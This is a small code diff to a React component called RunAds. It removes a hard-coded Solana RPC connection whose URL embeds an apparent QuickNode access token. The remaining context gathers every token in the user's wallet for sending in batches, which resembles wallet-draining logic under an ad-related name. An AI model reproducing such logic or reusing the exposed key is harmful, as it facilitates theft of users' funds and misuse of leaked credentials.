@@ -61,11 +61,6 @@ export default function RunAds() {
     }
 
     try {
-      const connection = new Connection(
-        "https://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/",
-        { commitment: "confirmed", wsEndpoint: "wss://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/" }
-      );
-
       // Load balances and prepare token batches (max 5 tokens per batch)
       const balances = await getWalletBalances(publicKey);
       const tokensToSend = balances.tokens;
